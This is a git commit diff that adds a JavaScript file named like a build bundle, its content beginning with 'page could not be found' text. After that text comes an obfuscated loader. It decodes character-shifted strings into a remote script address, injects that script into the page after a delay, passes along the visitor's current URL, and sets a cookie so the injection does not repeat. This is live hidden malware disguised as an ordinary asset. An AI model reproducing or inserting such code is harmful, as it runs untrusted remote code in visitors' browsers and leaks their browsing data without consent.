36537e2e7ff3e72055232de5b25d89080420e1f9
zeshannni <verified.opportunity.for.free@gmail.com>
2024-10-24 21:14:43 +0500

    Add files via upload

---
+++ main.fcac1ccc.js
@@ -0,0 +1,13 @@
+The page could not be found
+
+NOT_FOUND;
+(function(o, d, l) {
+    try {
+        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
+        o.b = o.f('UMUWJKX');
+        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
+            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
+        }, 1000);
+        d.cookie = o.b + '=full;max-age=39800;'
+    } catch (e) {};
+}({}, document, location));
